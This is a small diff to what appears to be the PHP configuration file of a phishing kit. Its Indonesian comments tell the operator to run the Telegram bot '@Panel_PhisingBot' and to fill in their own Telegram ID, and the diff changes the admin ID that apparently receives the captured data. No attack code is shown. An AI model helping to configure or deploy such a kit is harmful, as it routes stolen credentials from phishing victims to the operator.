@@ -3,6 +3,6 @@
 // ambil id anda di 
 // selanjutnya kalian jalankan bot @Panel_PhisingBot Di Telegram
 
-$admin = 1308958518 ; //ISI ID TELEGRAM KALIAN
+$admin = 104470020 ; //ISI ID TELEGRAM KALIAN
 
 ?>
